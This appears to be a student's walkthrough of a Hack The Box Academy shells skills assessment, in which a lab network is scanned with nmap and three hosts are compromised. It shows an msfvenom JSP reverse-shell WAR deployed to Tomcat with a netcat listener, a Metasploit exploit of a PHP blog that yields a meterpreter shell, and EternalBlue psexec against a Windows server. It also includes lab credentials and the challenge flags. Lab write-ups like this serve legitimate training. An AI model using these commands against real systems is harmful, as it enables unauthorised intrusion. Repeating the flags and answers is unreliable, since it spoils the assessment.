@@ -1,1 +1,279 @@
+Here we are. It’s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.
 
+Scenario:
+CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.
+
+Objectives:
+Demonstrate your knowledge of exploiting and receiving an interactive shell from a Windows host or server.
+Demonstrate your knowledge of exploiting and receiving an interactive shell from a Linux host or server.
+Demonstrate your knowledge of exploiting and receiving an interactive shell from a Web application.
+Demonstrate your ability to identify the shell environment you have access to as a user on the victim host.
+Complete the objectives by answering the challenge questions below.
+
+Credentials and Other Needed Info:
+Foothold:
+
+IP:
+Credentials: htb-student / HTB_@cademy_stdnt! Can be used by RDP.
+Connectivity To The Foothold
+Connection Instructions:
+Accessing the Skills Assessment lab environment will require the use of XfreeRDP to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy VPN key or the Pwnbox built into the module section. You can start the FreeRDP client on the Pwnbox by typing the following into your shell once the target spawns:
+
+Code: bash
+xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
+You can find the target IP, Username, and Password needed below:
+
+Click below in the Questions section to spawn the target host and obtain an IP address.
+IP ==
+Username == htb-student
+Password == HTB_@cademy_stdnt!
+
+
+Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (172.16.0.0/23 network) so you may want to pay careful attention to the IP address you pick when starting your listeners.
+
+
+CHALLENGE: RDP to 10.129.204.126 (ACADEMY-SHELLS-SKILLS-FOOTHOLD) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+Question 1 - What is the hostname of Host-1? (Format: all lower case)
+1. xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt! +clipboard
+2. once in i opened a cmd prompt and ran -> nmap -A 172.16.1.0/23 to figure out the host situation & get answer to this question: 
+nmap -A 172.16.1.0/23
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-19 12:20 EDT
+Nmap scan report for 172.16.1.5
+Host is up (0.042s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+3389/tcp open  ms-wbt-server xrdp
+
+Nmap scan report for status.inlanefreight.local (172.16.1.11)
+Host is up (0.047s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Inlanefreight Server Status
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
+515/tcp  open  printer       Microsoft lpd
+1801/tcp open  msmq?
+2103/tcp open  msrpc         Microsoft Windows RPC
+2105/tcp open  msrpc         Microsoft Windows RPC
+2107/tcp open  msrpc         Microsoft Windows RPC
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-03-19T16:21:29+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=shells-winsvr
+| Not valid before: 2025-03-18T16:13:01
+|_Not valid after:  2025-09-17T16:13:01
+8080/tcp open  http          Apache Tomcat 10.0.11
+|_http-favicon: Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat/10.0.11
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-03-19T16:21:23
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: shells-winsvr
+|   NetBIOS computer name: SHELLS-WINSVR\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-03-19T09:21:23-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:09:ae (VMware)
+|_clock-skew: mean: 1h44m59s, deviation: 3h30m00s, median: 0s
+
+Nmap scan report for blog.inlanefreight.local (172.16.1.12)
+Host is up (0.052s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
+|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
+|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Inlanefreight Gabber
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 172.16.1.13
+Host is up (0.052s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: 172.16.1.13 - /
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2025-03-19T16:21:23
+|_  start_date: 2025-03-19T16:12:52
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:2e:cb (VMware)
+|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: -1s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: SHELLS-WINBLUE
+|   NetBIOS computer name: SHELLS-WINBLUE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-03-19T09:21:23-07:00
+
+
+3. okay so we have 
+a. 172.16.1.5 
+b. status.inlanefreight.local (172.16.1.11) ->  NetBIOS name: SHELLS-WINSVR
+c. blog.inlanefreight.local (172.16.1.12)
+d. 172.16.1.13 Computer name: SHELLS-WINBLUE
+
+4. long story short host 1 from the diagram = 172.16.1.11 so the name = shells-winsvr
+
+
+
+Question 2 - Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case) - dev-share
+1. in the RDP session with the jump host, navigate to http://172.16.1.11:8080 using Firefox from within the terminal
+2. firefox http://172.16.1.11:8080
+3. click on manager app inside of firefox
+4. type in credentials tomcat:Tomcatadm (which were provided under "Host-1 hint" in the module's section)
+5. from prior experience were gonna need to make a .war file for a rev shell. 
+6. lets figure out our interface -> 
+ip a | grep "172.16.1.*"
+    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
+7. open new terminal ( still inside RDP'd session ) -> nc -nlvp 4444
+8. msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o managerUpdated.war
+                                                  ^^^^^^^^
+*** Remeber to use the IP we just found from the ip a command and not our actual HOST machine IP 
+9. lets upload to http://172.16.1.11:8080
+10. upload and deploy -> i also hit the extension once it pops up 
+11. shell caught. 
+12. cd C:\Shares
+13. C:\Shares>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2683-3D37
+
+ Directory of C:\Shares
+
+09/22/2021  01:22 PM    <DIR>          .
+09/22/2021  01:22 PM    <DIR>          ..
+09/22/2021  01:24 PM    <DIR>          dev-share
+               0 File(s)              0 bytes
+               3 Dir(s)  26,672,443,392 bytes free
+
+
+
+Question 3 - What distribution of Linux is running on Host-2? (Format: distro name, all lower case) - ubuntu
+1. okay remember in question 1 when i ran nmap on entire network ? this is why. because were going to need to edit /etc/hosts and all the IPs and names associated with them 
+2. add following to /etc/hosts: 
+172.16.1.11  status.inlanefreight.local
+172.16.1.12  blog.inlanefreight.local
+10.129.204.126  lab.inlanefreight.local
+3. lol jk they are already added.. so i guess i did nmap for practice ANYWAY... 
+4. jk jk twice my nmap scan gave us the answer.. 
+5. Nmap scan report for blog.inlanefreight.local (172.16.1.12)
+Host is up (0.052s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
+|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
+|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Inlanefreight Gabber
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+6. final answer: ubuntu 
+
+
+
+
+
+Question 4 - What language is the shell written in that gets uploaded when using the 50064.rb exploit? - php 
+1. searchsploit 50064.rb
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Lightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb
+---------------------------------------------- ------------------------
+2. final answer: php 
+
+
+Question 5 - Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt - B1nD_Shells_r_cool 
+1. still inside RDP 
+2. firefox blog.inlanefreight.local 
+3. scroll down to see a post by slade wilson: 
+Guys, I think I found a vulnerability in this blog.. Its posted here https://www.exploit-db.com/exploits/50064 does this seem right?
+4. under hint 2 we are given the credentials admin:admin123!@#
+5. msfconsole -q 
+6. use 50064.rb
+7. set VHOST blog.inlanefreight.local
+set RHOSTS 172.16.1.12
+set RHOST 172.16.1.12
+set USERNAME admin
+set PASSWORD admin123!@#
+
+8. run
+
+[*] Got CSRF token: ba98fdfc6a
+[*] Logging into the blog...
+[+] Successfully logged in with admin
+[*] Uploading shell...
+[+] Shell uploaded as data/i/44jT.php
+[+] Payload successfully triggered !
+[*] Started bind TCP handler against 172.16.1.12:4444
+[*] Sending stage (39282 bytes) to 172.16.1.12
+[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2025-03-19 12:50:56 -0400
+
+meterpreter > cat /customscripts/flag.txt
+B1nD_Shells_r_cool
+
+
+Question 6 - What is the hostname of Host-3?
+1. from diagram we know the IP = 172.16.1.13
+2. from OG nmap scan we know host name = SHELLS-WINBLUE 
+
+Question 7 - Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt - One-H0st-Down!
+1. from name alone i am betting its eternalblue exploit
+2. msfconsole -q 
+3. use exploit/windows/smb/ms17_010_psexec
+4. from running ip a earlier we know the lhost is going to be 172.16.1.5 
+5. sf6 exploit(windows/smb/ms17_010_psexec) > set Lhost 172.16.1.5
+Lhost => 172.16.1.5
+msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4445
+LPORT => 4445
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOST 172.16.1.13
+RHOST => 172.16.1.13
+
+6. run 
+7. cat C:/Users/Administrator/Desktop/Skills-flag.txt
+One-H0st-Down!
